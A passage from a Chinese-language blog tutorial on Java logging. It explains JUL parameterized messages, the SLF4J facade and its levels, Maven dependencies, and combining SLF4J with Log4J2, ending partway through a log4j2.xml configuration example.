进行输出</li><li>JUL 还提供另外一种记录方式，允许我们动态传递参数，<strong>从而代替拼接字符串</strong>：</li></ol></blockquote><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">String <span class="hljs-type">name</span> = &quot;Ba Tian&quot;;<br><span class="hljs-type">int</span> age = <span class="hljs-number">18</span>;<br>logger.log(<span class="hljs-keyword">Level</span>.<span class="hljs-keyword">INFO</span>,&quot;学生的姓名为：&#123;0&#125;，年龄为：&#123;1&#125;&quot;,<span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;<span class="hljs-type">name</span>,age&#125;);<br></code></pre></td></tr></table></figure><hr><h3 id="3、SLF4J-门面框架"><a href="#3、SLF4J-门面框架" class="headerlink" title="3、SLF4J  门面框架"></a>3、SLF4J  门面框架</h3><h4 id="3-1、SLF4J-概述"><a href="#3-1、SLF4J-概述" class="headerlink" title="3.1、SLF4J 概述"></a>3.1、SLF4J 概述</h4><p>SLF4J（Simple Logging Facade for Java）是一种日志门面框架，它并不直接进行日志实现，而是<font color="#ff0000">为各种日志框架提供统一的抽象接口（API）</font>，让开发者在应用中只需依赖于这一套 API，而无需针对不同的日志实现学习各自的专有 API</p><blockquote><p>[!NOTE] 注意事项</p><ol><li>如果需要配置日志框架的底层实现，应遵循底层日志实现的配置方式。SLF4J 作为日志门面，本身不具备配置能力，具体的日志管理和配置仍需在底层日志实现中完成。</li></ol></blockquote><hr><h4 id="3-2、SLF4J-支持的日志级别"><a href="#3-2、SLF4J-支持的日志级别" class="headerlink" title="3.2、SLF4J 支持的日志级别"></a>3.2、SLF4J 支持的日志级别</h4><p>SLF4J 仅支持以下标准级别：</p><ol><li><font color="#00b0f0">ERROR</font>：输出错误信息，表示严重错误或异常情况，应用可能无法继续进行</li><li><font color="#00b0f0">WARN</font>：输出警告信息，提示潜在的问题（推荐）</li><li><font color="#00b0f0">INFO</font>：输出常规运行信息，提供系统运行状态</li><li><font color="#00b0f0">DEBUG</font>：输出调试信息，比如详细的配置解析过程</li><li><font color="#00b0f0">TRACE</font>：输出最详细的信息，几乎是逐行解释发生了什么</li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li>SLF4J 本身只是个日志门面，不提供具体的日志实现，因此他没有默认的日志级别。实际的默认日志级别取决于我们绑定的底层日志实现：<ul><li><font color="#00b0f0">JUL</font>：默认日志级别是 INFO</li><li><font color="#00b0f0">Log4J</font>：默认日志级别是 ERROR</li><li><font color="#00b0f0">Log4J2</font>：默认日志级别是 ERROR</li></ul></li><li>如果需要调整日志级别（如开启或关闭日志，调整默认日志级别），必须在底层日志实现中进行具体配置。</li></ol></blockquote><hr><h4 id="3-3、使用-SLF4J-框架"><a href="#3-3、使用-SLF4J-框架" class="headerlink" title="3.3、使用 SLF4J 框架"></a>3.3、使用 SLF4J 框架</h4><h5 id="3-3-1、引入-SLF4J-相关依赖"><a href="#3-3-1、引入-SLF4J-相关依赖" class="headerlink" title="3.3.1、引入 SLF4J 相关依赖"></a>3.3.1、引入 SLF4J 相关依赖</h5><p>引入 <a href="https://mvnrepository.com/artifact/org.slf4j/slf4j-api/2.0.16">slf4j-api 依赖</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- SLF4J 日志门面依赖 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.slf4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>slf4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>XXXXXX<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h5 id="3-3-2、引入底层日志实现相关依赖"><a href="#3-3-2、引入底层日志实现相关依赖" class="headerlink" title="3.3.2、引入底层日志实现相关依赖"></a>3.3.2、引入底层日志实现相关依赖</h5><p>根据不同的底层日志实现，应选择相应的依赖，我们需要注意以下两点：</p><ol><li>SLF4J 之前的日志框架 并未遵循 SLF4J 标准，因此无法直接引入依赖后立即使用，需要额外引入适配器</li><li>而 SLF4J 之后的日志框架，如果已遵循 SLF4J 规范，则只需直接引入相关依赖即可正常使用（如 <code>Log4J2</code> 就没有遵循SLF4J 规范，仍然需要引入适配器）</li></ol><p>在此，我们选择引入 <a href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-slf4j2-impl">log4j-slf4j2-impl 依赖</a> 作为 Log4J2 的 SLF4J 适配器，并引入 <a href="https://mvnrepository.com/artifact/org.slf4j/slf4j-api/2.0.16">slf4j-api 依赖</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- Log4J2 适配器 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-slf4j2-impl<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>XXXXXX<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- SLF4J 日志门面依赖 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.slf4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>slf4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>XXXXXX<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h5 id="3-3-3、调用-SLF4J-Logger-记录日志"><a href="#3-3-3、调用-SLF4J-Logger-记录日志" class="headerlink" title="3.3.3、调用 SLF4J-Logger 记录日志"></a>3.3.3、调用 SLF4J-Logger 记录日志</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> Main &#123;  <br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) &#123;  <br>        Logger logger = LoggerFactory.getLogger(Main.<span class="hljs-keyword">class</span>.getName());  // 获取指定层级的 Logger，这里获取的是 com.example.Main 层级的 Logger（可以传入 <span class="hljs-type">name</span>.<span class="hljs-keyword">class</span>.getName()，也可以直接传入全类名字符串：&quot;com.example.Main&quot;）<br>        logger.trace(&quot;trace 信息&quot;);  <br>        logger.<span class="hljs-keyword">debug</span>(&quot;debug 信息&quot;);  <br>        logger.<span class="hljs-keyword">info</span>(&quot;info 信息&quot;);  <br>        logger.warn(&quot;warn 信息&quot;);  <br>        logger.error(&quot;error 信息&quot;);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>Logger 要来自 <code>org.slf4j</code> 包下</li><li>SLF4J 还提供另外一种记录方式，允许我们动态传递参数，<strong>从而代替拼接字符串</strong>：</li></ol></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 基础使用</span><br>String name = <span class="hljs-string">&quot;Ba Tian&quot;</span>;<br>int age = 18;<br>logger.log(Level.INFO,<span class="hljs-string">&quot;学生的姓名为：&#123;&#125;，年龄为：&#123;&#125;&quot;</span>,name,age);<br><br><br><span class="hljs-comment"># 进阶使用</span><br>try&#123;<br><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><br>&#125;<br>catch(ClaassNotFoudException e)&#123;<br>logger.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;xxx类中的xxx方法出现了异常，请及时关注相关信息&quot;</span>);<br>logger.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;具体错误是：&#123;&#125;&quot;</span>,e);<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="4、SLF4J-Log4J2"><a href="#4、SLF4J-Log4J2" class="headerlink" title="4、SLF4J + Log4J2"></a>4、SLF4J + Log4J2</h3><h4 id="4-1、SLF4J-Log4J2-概述"><a href="#4-1、SLF4J-Log4J2-概述" class="headerlink" title="4.1、SLF4J + Log4J2 概述"></a>4.1、SLF4J + Log4J2 概述</h4><p>使用 SLF4J 作为日志门面框架，搭配 Log4j2 的日志实现框架，绝对是当前市场上最强大、最灵活的日志功能实现方式。</p><hr><h4 id="4-2、Log4J2-组件介绍"><a href="#4-2、Log4J2-组件介绍" class="headerlink" title="4.2、Log4J2 组件介绍"></a>4.2、Log4J2 组件介绍</h4><p>Log4j2 主要由 <font color="#ff0000">Loggers (日志记录器)</font>、<font color="#ff0000">Appenders（输出控制器）</font>和 <font color="#ff0000">Layout（日志格式化器）</font>组成：</p><ol><li><font color="#00b0f0">Loggers</font>：<ol><li>Loggers（日志记录器），负责记录日志，并控制日志的输出级别（☆☆☆）</li><li>与 JUL 不同，Log4j2 中的日志信息在 Logger 中确定输出级别后，不会再经过 Handler 的再次过滤。这意味着 Logger 配置的输出级别直接决定最终的日志输出级别（☆☆☆）</li></ol></li><li><font color="#00b0f0">Appenders</font>：<ol><li>Appenders（输出控制器），负责把日志输出到指定位置，常用的 Appenders 有：<ol><li><font color="#7030a0">ConsoleAppender</font>：将日志输出到控制台</li><li><font color="#7030a0">FileAppender</font>：将日志写入到单一文件中</li><li><font color="#7030a0">RollingFileAppender</font>：将日志写入到文件中，支持按大小或时间滚动</li><li><font color="#7030a0">JDBCAppender</font>：将日志存储到关系型数据库中</li></ol></li></ol></li><li><font color="#00b0f0">Layout</font>：<ol><li>Layout（日志格式化器），决定了日志的格式化方式，即日志输出的具体格式，常用的 Layout 有：<ol><li><font color="#7030a0">HTMLLayout</font>：输出为 HTML 表格的格式</li><li><font color="#7030a0">JSONLayout</font>：输出为 JSON 格式</li><li><font color="#7030a0">XMLLayout</font>：输出为 XML 格式</li><li><font color="#7030a0">SimpleLayout</font>：简单的日志输出格式</li><li><font color="#7030a0">PatternLayout</font>：最强大的格式化组件，可以根据自定义日志输出格式（默认格式化器）</li></ol></li></ol></li></ol><hr><h4 id="4-3、Log4J2-支持的日志级别"><a href="#4-3、Log4J2-支持的日志级别" class="headerlink" title="4.3、Log4J2 支持的日志级别"></a>4.3、Log4J2 支持的日志级别</h4><p>Log4J2 支持以下日志级别：</p><ol><li><font color="#00b0f0">OFF</font>：禁止捕获所有级别的日志信息</li><li><font color="#00b0f0">FATAL</font>：输出严重错误信息，应用可能无法继续运行</li><li><font color="#00b0f0">ERROR</font>：输出错误信息，表示严重错误或异常情况，但应用仍然可以继续运行</li><li><font color="#00b0f0">WARN</font>：输出警告信息，提示潜在的问题（推荐）</li><li><font color="#00b0f0">INFO</font>：输出常规运行信息，提供系统运行状态</li><li><font color="#00b0f0">DEBUG</font>：输出调试信息，比如详细的配置解析过程</li><li><font color="#00b0f0">TRACE</font>：输出最详细的信息，几乎是逐行解释发生了什么</li><li><font color="#00b0f0">ALL</font>：捕获所有级别的日志信息</li></ol><p>无需担心 SLF4J 日志门面框架只有五个标准级别的限制。在配置层面，我们依然可以灵活设置日志级别，这是因为适配器在 SLF4J 和 Log4j2 之间建立了一套完整的映射关系。映射关系大致如下：<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/image-20250312195258282.png"></p><hr><h4 id="4-3、SLF4J-Log4J2-实战步骤"><a href="#4-3、SLF4J-Log4J2-实战步骤" class="headerlink" title="4.3、SLF4J + Log4J2 实战步骤"></a>4.3、SLF4J + Log4J2 实战步骤</h4><h5 id="4-3-1、引入-SLF4J-相关依赖"><a href="#4-3-1、引入-SLF4J-相关依赖" class="headerlink" title="4.3.1、引入 SLF4J 相关依赖"></a>4.3.1、引入 SLF4J 相关依赖</h5><p>引入 <a href="https://mvnrepository.com/artifact/org.slf4j/slf4j-api/2.0.16">slf4j-api 依赖</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- SLF4J 日志门面依赖 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.slf4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>slf4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>XXXXXX<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h5 id="4-3-2、引入-Log4J2-相关依赖"><a href="#4-3-2、引入-Log4J2-相关依赖" class="headerlink" title="4.3.2、引入 Log4J2 相关依赖"></a>4.3.2、引入 Log4J2 相关依赖</h5><p>引入 <a href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api/2.24.3">log4j-api 依赖</a>、<a href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.24.3">log4j-core 依赖</a>、<a href="https://mvnrepository.com/artifact/com.lmax/disruptor/3.4.4">disruptor 依赖</a>、 <a href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-slf4j2-impl">log4j-slf4j2-impl 依赖</a> </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- Log4J2 日志门面依赖 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.24.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- Log4J2 核心依赖 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.24.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- Log4J2 异步日志依赖 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.lmax<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>disruptor<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>XXXXXX<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- Log4J2 适配器 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-slf4j2-impl<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.24.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>log4j-api</code> 是 Log4j 的日志门面，为什么在已有 SLF4J 门面的情况下仍需要引入？<ul><li>虽然 SLF4J 是一个通用日志门面，但在使用 Log4j2 作为日志实现时，SLF4J 实际上会访问调用 <code>log4j-api</code>，再由它对接 Log4j2 的具体实现</li></ul></li><li>为什么引入的是 <code>Log4j2</code> 依赖，看起来却像是在引入 <code>Log4j</code> 依赖？<ul><li>如果依赖版本号为 2.x.x，说明确实是引入了 Log4j2 的依赖</li></ul></li></ol></blockquote><hr><h5 id="4-3-3、配置-Log4J2"><a href="#4-3-3、配置-Log4J2" class="headerlink" title="4.3.3、配置 Log4J2"></a>4.3.3、配置 Log4J2</h5><p>Log4j2 会自动在类路径中查找配置文件，通常我们在项目的 <code>/src/main/resources</code> 目录下创建一个名为 <code>log4j2.xml</code> 的配置文件即可，完成下述配置即可：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- 1. 根节点 --&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Configuration</span> <span class="hljs-attr">status</span>=<span class="hljs-string">&quot;WARN&quot;</span> <span class="hljs-attr">monitorInterval</span>=<span class="hljs-string">&quot;30&quot;</span>&gt;</span>  </span><br><span class="language-xml">  </span><br><span class="language-xml">    <span class="hljs-comment">&lt;!-- 2. 定义全局属性 --&gt;</span>  </span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Properties</span>&gt;</span>  </span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;LOG_PATTERN&quot;</span>&gt;</span>%d</span><span class="hljs-template-variable">&#123;yyyy-MM-dd HH:mm:ss&#125;</span><span class="language-xml"> [%t] %-5level %logger</span><span class="hljs-template-variable">&#123;36&#125;</span><span class="language-xml"> - %msg%n<span class="hljs-tag">&lt;/<span class="hljs-name">Property</span>&gt;</span>   <span class="hljs-comment">&lt;!-- 自定义日志的输出格式 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;LOG_PATH&quot;</span>&gt;</span>D:\\EnglishDeployment\\logs<span class="hljs-tag">&lt;/<span class="hljs-name">Property</span>&gt;</span>   <span class="hljs-comment">&lt;!-- 自定义文件的保存路径 --&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Properties</span>&gt;</span>  </span><br><span class="language-xml">  </span><br><span class="language-xml">    <span class="hljs-comment">&lt;!-- 3. 定义日志输出器（Appenders） --&gt;</span>  </span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Appenders</span>&gt;</span>  </span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 3.1 配置 ConsoleAppender 控制器 --&gt;</span>  </span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Console</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ConsoleAppender&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;SYSTEM_OUT&quot;</span>&gt;</span>  </span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">PatternLayout</span> <span class="hljs-attr">pattern</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;LOG_PATTERN&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>/&gt;</span>  <span class="hljs-comment">&lt;!-- 使用自定义的日志输出格式 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">Console</span>&gt;</span>  </span><br><span class="language-xml">  </span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 3.2 配置 FileAppender 控制器 --&gt;</span>  </span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">File</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;FileAppender&quot;</span> <span class="hljs-attr">fileName</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;LOG_PATH&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">/app.log&quot;</span>&gt;</span>  </span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">PatternLayout</span> <span class="hljs-attr">pattern</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;LOG_PATTERN&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>/&gt;</span> <span class="hljs-comment">&lt;!-- 使用自定义的日志输出格式 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">File</span>&gt;</span>  </span><br><span class="language-xml">  </span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 3.3 配置 RollingFileAppender 控制 --&gt;</span>  </span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">RollingFile</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;RollingFileAppender&quot;</span> <span class="hljs-attr">fileName</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;LOG_PATH&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">/rolling.log&quot;</span>  </span></span><br><span class="hljs-tag"><span class="language-xml">                     <span class="hljs-attr">filePattern</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;LOG_PATH&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">/rolling-%d</span></span></span><span class="hljs-template-variable">&#123;yyyy-MM-dd&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">-%i.log&quot;</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">PatternLayout</span> <span class="hljs-attr">pattern</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;LOG_PATTERN&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>/&gt;</span>  </span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">Policies</span>&gt;</span>  </span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">SizeBasedTriggeringPolicy</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;10MB&quot;</span>/&gt;</span> <span class="hljs-comment">&lt;!-- 文件达到 10MB 时滚动一次 --&gt;</span>  </span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">TimeBasedTriggeringPolicy</span>/&gt;</span> <span class="hljs-comment">&lt;!-- 每天滚动一次 --&gt;</span>  </span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">Policies</span>&gt;</span>  </span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">DefaultRolloverStrategy</span> <span class="hljs-attr">max</span>=<span class="hljs-string">&quot;7&quot;</span>/&gt;</span> <span class="hljs-comment">&lt;!-- 最多保留 7 个历史文件 --&gt;</span>  </span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">RollingFile</span>&gt;</span>  </span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Appenders</span>&gt;</span>  </span><br><span class="language-xml">  </span><br><span class="language-xml">    <span class="hljs-comment">&lt;!-- 4. 配置日志记录器（Loggers） --&gt;</span>  </span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Loggers</span>&gt;</span>  </span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 4.1 为某个特定包或类的 Logger 单独配置 --&gt;</span>  </span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Logger</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;com.example.service&quot;</span> <span class="hljs-attr">level</span>=<span class="hljs-string">&quot;DEBUG&quot;</span> <span class="hljs-attr">additivity</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span>  </span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">AppenderRef</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;FileAppender&quot;</span>/&gt;</span>   <span class="hljs-comment">&lt;!-- 添加 FileAppender 控制器 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">Logger</span>&gt;</span>  </span><br><span class="language-xml">  </span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 4.2 配置根日志记录器 RootLogger --&gt;</span>  </span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Root</span> <span class="hljs-attr">level</span>=<span class="hljs-string">&quot;INFO&quot;</span>&gt;</span>  </span><br><span class="language-xml">       